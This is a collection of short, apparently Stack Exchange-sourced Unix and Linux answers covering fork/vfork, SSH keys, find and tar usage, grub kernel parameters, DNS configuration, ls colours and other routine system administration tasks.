man pages are usually terse reference documents . wikipedia is a better place to turn to for conceptual explanations . fork duplicates a process : it creates a child process which is almost identical to the parent process ( the most obvious difference is that the new process has a different process id ) . in particular , fork ( conceptually ) must copy all the parent process 's memory . as this is rather costly , vfork was invented to handle a common special case where the copy is not necessary . often , the first thing the child process does is to load a new program image , so this is what happens : the execve call loads a new executable program , and this replaces the process 's code and data memory by the code of the new executable and a fresh data memory . so the whole memory copy created by fork was all for nothing . thus the vfork call was invented . it does not make a copy of the memory . therefore vfork is cheap , but it is hard to use since you have to make sure you do not access any of the process 's stack or heap space in the child process . note that even reading could be a problem , because the parent process keeps executing . for example , this code is broken ( it may or may not work depending on whether the child or the parent gets a time slice first ) : since the invention of vfork , better optimizations have been invented . most modern systems , including linux , use a form of copy-on-write , where the pages in the process memory are not copied at the time of the fork call , but later when the parent or child first writes to the page . that is , each page starts out as shared , and remains shared until either process writes to that page ; the process that writes gets a new physical page ( with the same virtual address ) . copy-on-write makes vfork mostly useless , since fork will not make any copy in the cases where vfork would be usable . linux does retain vfork . the fork system call must still make a copy of the process 's virtual memory table , even if it does not copy the actual memory ; vfork does not even need to do this . the performance improvement is negligible in most applications .
you need to set up key authentication on both machines , both the rebound machine ( server ) and the target machine ( pc ) . create a key pair on your client machine ( ssh-keygen ) if you have not already done so . then copy the public key to server and add it to the authorization list . then do the same thing for pc . ssh-copy-id server ssh-copy-id short  to avoid having to type your passphrase twice , run a key agent . many systems are set up to run one when you log in : check if the SSH_AUTH_SOCK environment variable is set . if it is not , run ssh-agent as part of your session startup . before you start using ssh in a login session , record your passphrase in the agent by running ssh-add ~/.ssh/id_rsa .
if you talk about simplest usage information optional parameters are listed in [] . for example usage section from man: usage: man [-adfhktwW] [section] [-M path] [-P pager] [-S list] [-m system] [-p string] name ...  so if your script can accept option1 and option2 but they are not mandatory you can display it like this : script [option1] [option2] 
if you use dism , make sure you have ample room in your swap . when you shmat an shm segment with SHM_SHARE_MMU ( which is not the default ) , you get an ism segment , which is automatically locked in memory ( not pageable ) . the cost of that mapping , in virtual memory , is just the size of the allocated shm region . ( since it cannot be paged out , no need to reserve swap ) . mlock has no effect on these pages , they are already locked . if you either attach the segment with SHM_PAGEABLE or with no attribute , you get a dism segment . that one is pageable . the initial cost is the same . but , if you mlock any of that memory , the mlocked zone gets accounted again for its locked ram usage . so the virtual memory cost is (whole mapping + mlocked zone) . it is as if , with SHM_PAGEABLE , the mapping was created " in swap " , and the zones you lock require additional reservation " in ram " ( the backing store for those locked pages is not released or un-reserved ) . so what i was seeing is normal , as-designed . some information about this can be found in dynamic sga tuning of oracle database on oracle solaris with dism ( 280k pdf ) . excerpt : since dism memory is not automatically locked , swap space must be allocated for the whole segment . [ . . . ] . but it could become a problem if system administrators are unaware of the need to provide swap space for dism . ( i was one of those unaware sysadmins . . . ) tip : use pmap -xa to see what type of segment you have . ism : notice the R in the mode bits : no reservation for this mapping . dism :
parsing the output of ls is always problematic . you should always use a different tool if you mean to process the output automatically . in your particular case , your command was failing -- not because of some missing or incompatible argument to ls -- but because of the glob you were sending it . you were asking ls to list all results including hidden ones with -a , but then you were promptly asking it to only list things that matched the */ glob pattern which does not match things beginning with. and anything ls might have done was restricted to things that matched the glob . you could have used .*/ as a second glob to match hidden directories as well , or you could have left the glob off entirely and just let ls do the work . however , you do not even need ls for this if you have a glob to match . one solution would be to skip the ls entirely and just use shell globing:* $ du -s */ .*/ | sort -n  another way which might be overkill for this example but is very powerful in more complex situations would be to use find:* $ find ./ -type d -maxdepth 1 -exec du -s {} + | sort -n  explanation : find ./ starts a find operation on the current directory . you could use another path if you like . -type d finds only things that are directories -maxdepth 1 tells it only to find directories in the current directory , not to recurse down to sub-directories . -exec [command] [arguments] {} + works much like xargs , but find gets to do all the heavy lifting when it comes to quoting and escaping names . the {} bit gets replaced with the results from the find . du -s you know * note that i used the -n operator for sort to get a numeric sorting which is more useful in than alphabetic in this case .
yes , the spaces and apostrophe will cause a problem . you will need to escape them by prefixing them with a backslash ( \ ) . the underscores are not a problem .
you can use this command to backup all your dotfiles ( .&lt;something&gt; ) in your $HOME directory : $ cd ~ $ find . -maxdepth 1 -type f -name ".*" -exec tar zcvf dotfiles.tar.gz {} +  regex using just tar ? method #1 i researched this quite a bit and came up empty . the limiting factor would be that when tar is performing it is excludes , the trailing slash ( / ) that shows up with directories is not part of the equation when tar is performing its pattern match . here 's an example : this variant includes an exclude of .*/ and you can see with the verbose switch turned on to tar , -v , that these directories are passing through that exclude . method #2 i thought maybe the switches --no-wildcards-match-slash or --wildcards-match-slash would relax the greediness of the .*/ but this had no effect either . taking the slash out of the exclude , .* was not an option either since that would tell tar to exclude all the dotfiles and dotdirectories : $ tar -v --create --file=do.tar.gz --auto-compress --no-recursion --exclude={'.','..','.*'} .* $  method #3 ( ugly ! ) so the only other alternative i can conceive is to provide a list of files to tar . something like this : this approach has issues if the number of files exceeds the maximum amount of space for passing arguments to a command would be one glaring issue . the other is that it is ugly and overly complex . so what did we learn ? there does not appear to be a straight-forward and elegant way to acomplish this using tar and regular expressions . so as to @terdon 's comment , find ... | tar ... is really the more appropriate way to do this .
you just need to put the location of the new binary in your PATH first . when you try to run java , the shell will search your path for the first instance and run it . try this : $ export PATH=/opt/jdk1.6.0_35/bin:$PATH  that is assuming you are using bash , or a similar shell . now any commands that exist in /usr/bin/ will be overridden by those in the new directory .
this is actually the documented and expected behavior , from :help % . find the next item in this line after or under the cursor and jump to its match . i do not know of any way to make % search beyond the current line . you could try ] and its relatives as a workaround .
i wrote a python script to perform the task . it searches for all objects in the pdf file ( marked by obj and endobj ) and checks for every object if it is an annotation ( /Type/Annot ) of the highlight type ( /Subtype/Highlight ) . if that is the case the color definition ( /C[...] ) will be replaced . there are some limitations : no real parsing of the pdf is done . the regular expressions used may not be suitable for some pdf files . this might not work for encrypted or compressed pdf files . ( i am not sure whether the annotations might be compressed . ) the original file will be overwritten . do not blame me for lost data ! ( the script is easily edited to create new files . ) i assume that certain pdf objects reference other objects by their position in the file . thus , i prevent the file size from changing . this means the new color definition might not take up more bytes than the old one . the color definition is not validated . you might break your pdf with an invalid expression .
first of all , your given configuration of the default gateway is not valid . 192.168.0.1 is not within the network of 192.168.9.1/28 . i suspect you made a typo , so i assume you meant 192.168.9.10 as the default gateway here . referring to the rhel 6 deployment guide section 8.2 for the address and section 8.4 for routes : create/edit a file /etc/sysconfig/network-scripts/ifcfg-eth0 containing : DEVICE=eth0 BOOTPROTO=none ONBOOT=yes NETMASK=255.255.255.240 # this is /28 IPADDR=192.168.9.1 USERCTL=no  create/edit the route configuration file /etc/sysconfig/network-scripts/route-eth0: default 192.168.9.10 dev eth0 
from " help continue": so you want continue or continue 1 to go to the next iteration of until , or continue 2 to go to the next iteration of while .
i do not really see a difference between copying many files and other tasks , usually what makes the command line more attractive is simple tasks which are trivial enough for you to do on the command line , so that using the gui would be a waste of time ( faster to type a few characters than click in menus , if you know what characters to type ) ; very complex tasks which the gui just is not capable of doing . there is another benefit i see to the command line in one very specific circumstance . if you are performing a very long operation , like copying many files , and you may want to check the progress while logged into your machine remotely , then it is convenient to see the task 's progress screen . then it is convenient to run the task in a terminal multiplexer like screen or tmux . start screen , start the task inside screen , then later connect to your machine with ssh and attach to that screen session .
deleting a file means you are making changes to the directory it resides in , not the file itself . your group needs rw on the directory to be able to remove a file . the permissions on a file are only for making changes to the file itself . this might come off as confusing at first until you think about how the filesystem works . a file is just an inode , and the directory refers to the inode . by removing it , you are just removing a reference to that file 's inode in the directory . so you are changing the directory , not the file . you could have a hard link to that file in another directory , and you had still be able to remove it from the first directory without actually changing the file itself , it would still exist in the other directory .
i found this : https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=639261 which led me to try this : $ sudo rm /var/lib/dbus/machine-id $ sudo service messagebus restart  now i can run gnome-terminal !
update : i have been testing this further . . . it is behaving oddly ! ! , or as you mention , it may not be the right syntax contortion : ) i am starting to think that this construct is not appropriate for arrays . . . it works when x is unset , but i have just discoverd that it behaves oddly when x is set . . the lhs ' x ' is assigned to just the first elemnet of the rhs ' x ' array . . . perhaps := may do the trick . . . update 2: i am convinced that this will not work with arrays ( but if i am wrong , it would not be the first time ) . . . i have added more tests to the script . . and the nett result is that whenever x is assigned a value via this method , it is only assigned the $x / $x [ 0 ] value . . . . an interesting page : the deep , dark secrets of bash the output is :
from what i observe in the output of the pastebin page , i see the external hdd is formatted as ntfs partition . so i believe if you remount your partition as ntfs type you will be able to use the external hdd . just unmount your partition using umount /dev/sdb1 and then remount it using the below command . mount /dev/sdb1 /run/media/shravan/ -t ntfs-3g -o nls=utf8,umask=0222  as per patrick 's comments , the file system is mounted with the in-kernel ntfs driver , which is read only . so if the system has ntfs-3g the mount should be used as , mount /dev/sdb1 /run/media/shravan/ -t ntfs-3g -o nls=utf8,umask=0222  references http://www.pendrivelinux.com/mounting-a-windows-xp-ntfs-partition-in-linux/ stackexchange-url stackexchange-url
the answer is pretty simple :- ) you should put in there your documents you are working on and the dotfiles of the applications you use . theres no such thing like a minimal set of files you need . if an application is missing its configuration file , it will usually create a new one like at the first start . which files you will need depends on the applications you use , so you are the only one who can answer this . if you are unable to trace some config files , keep an eye on the subdirectories of ~/.gnome2 or ~/.kde . to tell the system , where the location of your new home directory is , you should just automount your pendrive to /home/username or simply change the location of your users home directory in /etc/passwd to your pendrives mountpoint . if this does not fit your question , please be more specific . :- )
if you have access to root , you can edit the /etc/apt/sources . list file as described on the debian site here use su enter root password then with an editor ( nano is easy to use as it has menus if you have it installed otherwise vi is most likely to be present , see a manual for vi here ) nano /etc/apt/sources . list or vi /etc/apt/sources . list
this will put the directory on the home partition . #do this as root mv /srv/media /home; ln -s /home/media /srv  you may want to consider looking at disk quotas at well .
/usr/share/X11/xkb/rules/xorg.lst has all options and variants for xkbmap polytonic is a variant so would use setxkbmap gr -variant 'polytonic' . fluxbox menu look correct .
using the gui see this so q and a on how to do exactly what you want , titled : convert pem to ppk file format . excerpt download your . pem from aws open puttygen click " load " on the right side about 3/4 down set the file type to . browse to , and open your . pem file putty will auto-detect everything it needs , and you just need to click " save private key " and you can save your ppk key for use with putty using the command line if on the other hand you had like to convert a .pem to .ppk file via the command line tool puttygen , i did come across this solution on so in this q and a titled : how to convert ssh keypairs generated using puttygen ( windows ) into key-pairs used by ssh-agent and keychain ( linux ) . excerpt $ puttygen keyfile.pem -O private-openssh -o avdev.pvk  for the public key : $ puttygen keyfile.pem -L  references converting your private key ( putty )
i am answering this in the general context of " journalled filesystems " . i think that if you did a number of " unclean shutdowns " ( by pulling the power cord or something ) sooner or later you had get to a filesystem state that would require fsck or the moral equivalent of fsck , xfs_repair . the ext4 fileystsm on my laptop for the most part just replays the journal on every reboot , clean shutdowns included , but every once in a while , it does a full-on fsck . but ask yourself what " replaying the journal " accomplishes . replaying a journal just ensures that the diskblocks of the rest of the fileystem match the ordering that the journal entries demand . replaying a journal amounts to a small fsck , or to parts of a full on fsck . i think there is some verbal sleight of hand going on : replaying a journal does part of what traditional fsck does , and xfs_repair is exactly what the same kind of program that e2fs.fsck ( or any other filesystem 's fsck ) is . the xfs people just believed or their experience led them to not running xfs_repair on every boot , just to replaying the journal .
my mainboard is an asus p8z77-m . the bios version was 0802 . this bios has a bug : it assigns the same irq ( 16 ) to all high-throughput devices which can cause all kinds of problems ( like freezing the desktop when you copy files to an usb device ) . upgrading to version 1206 improved the situation . the network card now gets its own irq and the ping times are now where they should be :
if you are sure that the fields between the commas do not contain any whitespaces than you could do something like this : for job in $(echo $all_jobs | tr "," " "); do sendevent -verbose -S NYT -E JOB_OFF_HOLD -J "$job" --owner me done  if you need something more robust , take a look at the tools needed to deal with csv files under unix .
as i understand , you want to list files that contain both " keyword1" and " keyword2" . to do that , you can use two -exec tests in following way : find . -name "*.xml" -exec grep -iq keyword1 {} \; -exec grep -iH keyword2 {} \;  this will run the second grep conditionally - if the first one returned true . the -q option prevents output from the first grep , as it would list all the files that include only " keyword1" . since the -H option outputs the matching line together with the file name , you had probably want to use -l instead . so find . -name "*.xml" -exec grep -iq keyword1 {} \; -exec grep -il keyword2 {} \;  this will yield similar output to what caleb suggested , but without the need of additional -print .
what part of your webserver is even doing dns lookups ? most webserver configurations explicitly disable reverse dns lookup of each incoming user , for speed ( because dns is slow in general ) . as patrick notes , nscd is doing the right thing and respecting the positive ttl values . yes , you could override it ( unbound would let you do this easily , just modify server.cache-min-ttl , has warnings about increasing it beyond 1 hour for the same reasons ) . however , your queries are probably mostly rdns , which will tend to have longer ttls in general . additionally , since your maximum number of cached values is so low , i would like to note that you are hardly getting any traffic . if you do care about where you users repeat from that often , i would suggest logging it outside nscd , and not worrying about it anymore . edit ( 2013/12//09 ) : nscd -g hosts stats from dev.gentoo.org ( no blocks in comments ) :
edit /etc/systemd/logind.conf and make sure you have , HandleLidSwitch=ignore  which will make it ignore the lid being closed . ( you may need to also undo the other changes you have made ) . full details over at the archlinux wiki . the man page for logind . conf also has the relevant information ,
exit is usually a shell built-in , so in theory it does depend on which shell you are using . however , i am not aware of any shell where it operates other than exiting the current process . from the bash man page , so it does not simply end the current if clause , it exits the whole shell ( or process , in essence , since the script is being run within a shell process ) . from man sh , and lastly , from man ksh ,
the issue here is that . is used to signify any single character . so the . would match the 5 in 50 but , with nothing to match the 0 , the rest of the line fails to match . in any case , since you know that what you are looking for is any number , you should be more specific with your regex . match any number with : [0-9]\+  if you know that this number can have an optional fractional part ( after a decimal point ) , you can use the following : [0-9]\+\(\.[0-9]\+\)?  the backslash before the + and the parens should be omitted if you are using grep 's -P ( pcre ) option . if you do plan to use the -P option , you should know it is not in the posix standard and may not be available on all platforms .
the piece of software responsible for font selection in linux is fontconfig . it examines the properties of each font as well as its own configuration to determine which ones have glyphs that cover specific languages partially or fully and substitutes them as appropriate .
seems to be pretty straightforward to do with genisoimage , in the package with the same name on debian : genisoimage -o output_image.iso directory_name  there are many options to cover different cases , so you should check the man page to see what fits your particular use case . see also how-to : create iso images from command-line
the wget redirection problem can be solved by using wget --trust-server-names http://www.example.com/X?1234 
i solved it by following the advice described here : https://bugs.launchpad.net/ubuntu/+source/util-linux/+bug/367782
it is a directory whose name is "~" . your shell will attempt to expand "~" if it is the first character of an argument , so you have to take special measures . $ mkdir ./~ $ file ./~ ./~: directory $ rm -ri ./~ rm: remove directory \u2018./~\u2019? y 
just a thought : insert installation cd in the drive reboot start installation at the second stage , when the hardware is initialized go to console mount your harddisk mount cd cp -av /your_cd_mount_point /your_harddrive/installcd when done , eject cd , reboot run system in runlevel 3 rpm -qa --last > installed_recently_rpms go to repositories management disable all repositories add local repo from hdd ( the one you just installed ) accept , run software managemet find all packages which were recently updated ( see point above ) , choose " update unconditionally " accept wait and pray reboot good luck !
awk does not remember the field positions or the delimiter strings . you will have to find out the field positions manually . it is not very hard .
there are two command line interfaces to printing : in the bsd interface , use lpr to print , lpq to view pending jobs , lprm to cancel a job . in the system v interface , use lp to print , lpstat to view pending jobs , cancel to cancel ongoing jobs . there are several printing systems available for linux and other unices . cups is the most common one nowadays . it comes with a system v interface by default , and has a bsd interface that may or may not be installed . if you do not have cups and are running linux or *bsd , you have a bsd system . different printing systems have different sets of options and other commands , but they are similar enough for simple cases . to cancel a printing job , use lpq or lpstat ( whichever is available , or either if both are available ) to see the job number , then lprm or cancel to cancel the job . with cups , if you need to cancel a job really fast , cancel -a will cancel all your pending jobs . most implementations of lprm will cancel the job currently printing on the default printer if called with no argument .
as you already have the script to select only the files you want , why not tar ? it preserves the directory structure , it can compress with simple command line flags ( -z or -j . it is a single file , so easier to move around , and it is a well-known and ubiquitous tool . tar cfj archive.tar.bz2 "${myfiles[@]}" 
i do not know about wine , but you could use attic manager . it can load quicken idb file directly , and you can then either export it to csv or keep using attic manager ( it fits my needs just fine ) to keep track of your inventory . it is a native linux application .
sftp is not ftp . it is the sftp subsystem of ssh , it is handled by the sshd daemon , not vsftpd or any ftp server . it is on the ssh tcp port ( 22 ) , not the ftp port 21 ( well ftp commands are on 21 while data connections are on arbitrary ports , and those multiple connections in ftp are one of the many reasons why sftp is so much better than ftp ) . ss -lp sport = :22  or ss -lp sport = :ssh  would show you that sshd is handling the connections there . if you want to disable SFTP but retain ssh access ( though that would make little sense unless users land with a restricted shell on that machine ) , you have to disable sftp in sshd_config by commenting out the Subsystem sftp... line .
apt-get update is the way i would do it . it hits all repositories . failing that , you could pretend to force the reinstallation of a small package with apt-get clean; apt-get -d --reinstall install hostname ( this will mark the package as to-be-installed , so pick a package that is already installed ) .
in openssl.cnf at the top add the entry SAN = "email:copy" ( to have a default value in case the environment variable SAN is not set ) and in the respective section use SubjectAltName = ${ENV::SAN} . now just call SAN="email:copy, email:adress@two" openssl ... , where email:copy makes sure the main address is used as well . ( adapted from here )
xine is not being developed anymore . change to another phonon-backend . i.e. after that xine problem you have have described , i am running phonon-backend-vlc flawlessly .
it is typical for programs to force the " some_string " part to be the last argument so that .abc.ksh "some_string" -a "sample text" is an error . if you do this , then after parsing the options , $OPTIND holds the index to the last argument ( the "some_string" part ) . if that is not acceptable , then you can check at the beginning ( before you enter the while to see if there is a non-prefixed argument . this will let you have "some_string" at the beginning and at the end . if you needed to have it in the middle , you could either not use getopts or you could have two sets of getopts . when the first one errors out , it could be due to the non-prefixed argument ; get it and start a new getopts to get the remaining args . or you can skip getopts all together and roll your own solution .
turn on the null_glob option for your pattern with the N glob qualifier . list_of_files=(*(N))  if you are doing this on all the patterns in a script or function , turn on the null_glob option : setopt null_glob . this answer has bash and ksh equivalents . do not use print or command substitution ! that generates a string consisting of the file names with spaces between them , instead of a list of strings . ( see what is word splitting ? why is it important in shell programming ? )
the documentation states " starting in the solaris 10 4/09 release , ipsec is managed by smf . " as you are using an older release , it is expected for ipsec not to show up as a service .
which 2 commands ? /usr/bin/java is a soft ( symbolic ) link to /usr/lib/jvm/java-1.6.0-openjdk-1.6.0.0.x86_64/jre/bin/java there is no difference as they are the same file . if you type something like ls -l /usr/bin/java  you might get a result such as : lrwxrwxrwx. 1 root root 22 Aug 5 17:01 /usr/bin/java -&gt; /etc/alternatives/java  which would mean you can have several java versions on your system and use alternatives to change the default one . otherwise you can simply add and remove links to change the default one manually . to create symbolic links use the command ln -s /usr/lib/jvm/java-1.6.0-openjdk-1.6.0.0.x86_64/jre/bin/java /usr/bin/java  or in general form ln -s &lt;original file&gt; &lt;link to file&gt;  and use rm to delete the link as you would delete any other file .
your looking for a distribution , optimized for flash disk installation ? i believe the concept of flash must be expounded . as you already knew , an ssd is not directly controlled . firmware exists , as an intermediate , which controls the physical read/write process . additionally as you understood , ssd firmware has a multitude of longevity features included . flash specific filesystems are designed to be implemented on raw nand mtds . basically for any flash storage lacking a controller , which means most non-block devices . usb flash drives , are not mtds , they have a flash memory controller . you generally do not want to use a flash filesystem , even if possible , on a block device . this should answer your question , regarding flash specific filesystems . as for other optimizations , most everything that holds true for ssds applies to usb flash . the exception being trim support , as most usb flash devices lack trim . if you have any more questions , plesae comment . -j .
the name of the executable your looking for is called plasma-desktop . i would try it out first , and if your satisfied with the results , then set it to autostart . you are required to install a good chunk of the kde dependencies to make it happen , but should not have a problem running just the plasmoids . i will say this , plasmoids are the best desktop widgets around . it becomes obvious once you compare the offerings of other available engines . unfortunately they are not the easiest to write , and they are highly integrated with the kde de . you would get a much lighter environment running a light standalone widget engine . i suspect though , because of your specified applet , that alternative web widgets are not what you want . if you are having trouble with clean automounting , which can be an issue on clean install flux/black/openbox , good lightweight udisks/udev scripts are available from packages . update : in response to new issues . it is possible to run single plasmoids , in their own window . you would need to use plasmoidviewer to run the device notifier . it is known for its use in developing widgets , and also considered fairly ugly . however it should work , if you only desire to run the one single widget .
if you are using tmux 1.7 , you can use the renumber-window option : renumber-windows [ on | off ] if on , when a window is closed in a session , automatically renumber the other windows in numerical order . this respects the base-index option if it has been set . if off , do not renumber the windows . setting this in your .tmux.conf like so : set -g renumber-windows on means that closing window #2 will renumber window #3 to #2 and opening a new window will place it at #3 .
i have had good results with clonezilla which uses partclone
as mat already said , in the general case you should be aware of the fact that every byte can be in a filename , except the NUL character ( as it delimits the end of the string ) and the / ( as it deleimits path elements ) . so your xargs example should be ( on a gnu system ) find /tmp -name core -type f -print0 | xargs -0 /bin/rm -f  equivalent is a -exec in the find , but with a + instead of the \; . find /tmp -name core -type f -exec /bin/rm -f {} +  this version does not call /bin/rm for every file , but bundles the arguments , just as xargs does .
one way using perl with the help of the XML::Twig parser : run it with your xml file as unique argument , like : perl script.pl xmlfile 
the kernel line in grub should looks like : kernel /vmlinuz-3.1.4-1.fc16.x86_64 ro root=/dev/VolGroup00/LogVol00 rhgb LANG=en_US.UTF-8 crashkernel=128M  there is a note in the instructions : ( . . . ) an example command line might look like this ( for grub2 , " kernel " is replaced by " linux " ) : so , the one you are looking for is how to replace the kernel boot parameters . this is easily achievable modifying the GRUB_CMDLINE_LINUX_DEFAULT in the /etc/default/grub file . then running su -c 'grub2-mkconfig -o /boot/grub2/grub.cfg' to update the script . open with an editor /etc/default/grub look for the GRUB_CMDLINE_LINUX_DEFAULT , add it if it is not present . append the crashkernel=128M to the line , like this : GRUB_CMDLINE_LINUX_DEFAULT="quiet crashkernel=128M"  save the file . run su -c 'grub2-mkconfig -o /boot/grub2/grub.cfg' check the grub . cfg file , that contains the lines correctly : restart and done .
on ubuntu 10.04 , you can configure the networking so it gets only your machine 's ip via dhcp , but lets you set everything else statically . in system > network connections , go into your wireless card 's setup and select " automatic ( dhcp ) addresses only " from the method drop-down . below , you will then be able to give static dns server addresses . this feature is common on lots of oses , though there is no agreement on what to call the feature or where to put it . the arch linux info in the comment below is one possibility . os x and windows can do it , too . if your system truly has no such feature , you can can temporarily overwrite /etc/resolv.conf to try out a different set of dns servers . such changes will persist until the next dhcp lease renewal . regardless , the way to debug a problem like this is to try using a public dns service instead of your phone company 's . i like to use google 's public dns servers , since their addresses are easy to remember : 8.8.8.8 8.8.4.4 another popular public dns service is opendns , whose servers are : 208.67.222.222 208.67.220.220 if that works , you can just keep using these servers , since they likely have advantages over the generic dns services provided by your isp . or , you can then start from a position of being able to blame the phone company 's dns in some way and attack the problem from that direction . if this change does not help , you have exonerated the phone company 's dns servers , so you know the problem is inside the house .
does man -k work ? if so , then : man -k "$@" | cut -f1 -d' ' | xargs man  might do what you want
try doing this : iptables -A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables denied: " --log-level 7 
maybe its ignoring the signal for some reason . did you try kill -9 ? but please note : kill -9 cannot be ignored or trapped . if a process sees signal 9 , it has no choice but to die . it can not do anything else - not even gracefully clean up its files .
apart from coloring files based on their type ( turquoise for audio files , bright red for archives and compressed files , and purple for images and videos ) , ls also colors files and directories based on their attributes : black text with green background indicates that a directory is writable by others apart from the owning user and group , and has the sticky bit set ( o+w, +t ) . blue text with green background indicates that a directory is writable by others apart from the owning user and group , and has not the sticky bit set ( o+w, -t ) . stephano palazzo over at ask ubuntu has made this very instructive picture over the different attribute colors : as terdon pointed out , the color settings can be modified via dircolors . a list of the different coloring settings can be accessed with dircolors --print-database . each line of output , such as BLK 40;33;01 , is of the form : [TARGET] [TEXT_STYLE];[FOREGROUND_COLOR];[BACKGROUND_COLOR]  TARGET indicates the target for the coloring rule TEXT_STYLE indicates the text style : 00 = none 01 = bold 04 = underscore 05 = blink 07 = reverse , 08 = concealed FOREGROUND_COLOR indicates the foreground color : 30 = black 31 = red 32 = green 33 = yellow 34 = blue , 35 = magenta 36 = cyan 37 = white BACKGROUND_COLOR indicates the background colors , the color codes are the same as for the foreground fields may be omitted starting from the right , so for instance .tar 01;31 means bold and red .
what exactly do you see ? with the script opts="-x ''" echo curl http://somepage $opts opts="-x \'\'" echo curl http://somepage $opts  with bash 3.2.39 or 4.1.5 , i see the first call to curl ( well , echo curl ) has a last argument consisting of two characters '' . the trace escapes special characters : ' appears as '\'' ( a common idiom to “escape” single quotes inside single quotes ) . formally , ''\'''\''' consists of an empty single-quoted string '' followed by the backslash-quoted character \' , then again '' , again \' , and a final '' . ( ksh shows this as the slightly more readable $'\'\'' . ) the second call passes four characters \'\' . under the normal sh parsing rules , you can not make an empty argument by expanding an unquoted variable . word splitting cuts only where there is a non-whitespace or quoted character . since you are using bash , you can put multiple options in an array . this also works in ksh and zsh . opts=(-x "") curl http://somepage "${opts[@]}"  for this particular case , you can override the environment variable instead . http_proxy= curl http://somepage 
install curlftpfs opkg update; opkg install curlftpfs  then create a script that will run after every boot of the router vi /etc/rc.d/S99tcpdump  the content of s99tcpdump make it executable chmod +x /etc/rc.d/S99tcpdump  reboot router , enjoy . p.s. : looks like "-s 0" is needed because there could be messages like : " packet size limited when capturing , etc . " - when loading the . pcap files in wireshark p.s. 2: make sure the time is correct because if not , the output filename could be wrong . .
it is not a security flaw ; you are able to strace the process because it is your process . you can not just attach strace to any running process . for example : $ sudo sleep 30 &amp; [1] 3660 $ strace -p 3660 attach: ptrace(PTRACE_ATTACH, ...): Operation not permitted  su is reporting an incorrect password because it does not have sufficient permission to read /etc/shadow anymore . /etc/shadow is where your password hash is stored , and it is set so only root can read it for security reasons . su has the setuid bit set so it will be effectively run as root no matter who runs it , but when you run it through strace that does not work , so it ends up running under your account i am not sure what you mean by " how much damage could be caused " . as you saw , su does not work from within strace , so you are going to render it nonfunctional . if you mean " could somebody use this to steal my password " , they would need the ability to set aliases in your shell , which they should not have permission to do unless you have made your login files world-writable or something similar . if they did have permission to set aliases , they could just alias su to a patched version that records your password directly ; there is nothing special about strace
here is the problem in your understanding : my understanding is that the bootloader grub2 , is mounted to /boot . grub is not " mounted " on boot . grub is installed to /boot , and is loaded from code in the master boot record . here is a simplified overview of the modern boot process , assuming a gnu/linux distribution with an mbr/bios ( not gpt/uefi ) : the bios loads . the bios loads the small piece of code that is in the master boot record . grub does not fit in 440 bytes , the size of the master boot record . therefore , the code that is loaded actually just parses the partition table , finds the /boot partition ( which i believe is determined when you install grub to the master boot record ) , and parses the filesystem information . it then loads stage 2 grub . ( this is where the simplification comes in . ) stage 2 grub loads everything it needs , including the grub configuration , then presents a menu ( or not , depending on user configuration ) . a boot sequence is chosen . this could be by a timeout , by the user selecting a menu entry , or by booting a command list . the boot sequence starts executing . this can do a number of things - for example , loading a kernel , chainloading to another bootloader - but let 's assume that the boot sequence is standard gnu/linux . grub loads the linux kernel . grub loads the initial ramdisk . the initial ramdisk mounts / under /new_root ( possibly cryptographically unlocking it ) , starts udev , starts resume-from-swap , etc . the initial ramdisk uses the pivot_root utility to set /new_root as the real / . init starts . partitions get mounted , daemons get started , and the system boots . notice how the kernel is only loaded at step 7 . because of this , there is no concept of mounting until step 7 . this is why /boot has to be mounted again in step 9 , even though grub has already used it . it may also be of use to look at the grub 2 section of the wikipedia page on grub .
with the following script it works ( using mplayer , which is probably not present on many systems ) . #!/bin/sh grep -A 1000 --text -m 1 ^Ogg "$0" | mplayer - exit OggS^@^B^@^@^@^@^@^@^@^@^]f&lt;8a&gt;g^@^@^@^@lY\xdf\xb8^A^^^Avorbis^@^@^@^@^A"V^@^@^...  the last line is the beginning of the audio file binary . the grep command searches for the first occurrence of ogg in the file $0 ( which is the script file itself ) and prints 1000 lines after that line ( is enough for my small audio test file ) . the output of grep is then piped to mplayer which is reading /dev/stdin ( abbreviation for /dev/stdin is - ) . i have created this file by concatenating the script file playmeBashScript.sh with the audio file sound.ogg: cat playmeBashScript.sh sound.ogg &gt; playme.sh  a more general and a bit shorter version with sed instead of grep ( thanks to elias ) : #!/bin/sh sed 1,/^exit$/d "$0" | mplayer - exit OggS^@^B^@^@^@^@^@^@^@^@^]f&lt;8a&gt;g^@^@^@^@lY\xdf\xb8^A^^^Avorbis^@^@^@^@^A"V^@^@^...  in this case sed selects all lines from number one up to the line where it finds the word exit and deletes them . the rest is pasted and piped to mplayer . of course that only works if the word exit occurs only once in the script before the binary data .
i do not know why that option would be useful . however here 's an example : $ look -df uncle /usr/share/lib/dict/words uncle $ look -df -tc uncle /usr/share/lib/dict/words unchristian uncle uncouth unction  i suppose it is to give you a mechanism to look up " similar " words if you do not have complete control over the lookup-string .
from here ( centos . org ) useradd ( which is the actual binary the runs when you call adduser , it just behaves differently . see here about that . ) has an flag -r which is documented as follows : -r Create a system account with a UID less than 500 and without a home directory  which sounds like what you want to do .
this is not possible with an alias , because it only expands an abbreviation . however , we do have functions : function killapp () { pidof $1 | xargs kill } 
on my solaris systems , even the xpg4 version of grep does not include the -o option . but if you have the sunwggrp package installed , you will find gnu egrep available as /usr/sfw/bin/gegrep .
your command works fine here . my guess is that a firewall , either at your location or at your isp , is blocking the dns requests or responses . the normal dig www.uniroma1.it likely works because said firewall is allowing requests to certain servers , like the ones provided by your isp and maybe 8.8.8.8 .
the reason this does not work is because bash performs brace expansion before command substitution ( the bash reference manual has some information about this ) . the substitution is not performed until after the brace expansion already occurred . the only way you could do this is by using eval , but do not do that in this case , as you will allow arbitrary command execution . instead you have to seek some other method . this should produce the output you seek : for file in *; do printf '%s ' "foo/bar/$file" done; echo 
if this is going to be an on-going process , then you will need two files , the old and new ( which would become the old for next time ) . the sort and comm -13 are the key . sort is obvious , but comm ( short for " common" ) will show lines that are in the first file ( column 1 ) , second file ( column 2 ) or both ( column 3 ) . the -13 option says to " take away column one and three " leaving only lines that are not in just the older and not common to both . unfortunately , if you cannot trust the time stamps on the files , then this would be a very intensive process for large directory trees .
